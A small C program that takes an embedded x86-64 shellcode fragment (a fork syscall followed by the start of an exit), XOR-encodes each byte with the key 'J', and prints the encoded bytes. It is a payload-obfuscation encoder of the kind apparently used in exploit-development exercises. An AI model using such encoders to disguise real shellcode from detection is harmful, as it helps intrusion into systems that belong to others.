#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c";

int main (int argc, char **argv) 
{
  char xor_key = 'J';
  int payload_length = (int) sizeof(buf);
  for (int i=0; i<payload_length; i++){
    printf("\\x%02X",buf[i]^xor_key);
  }
  return 0;
}
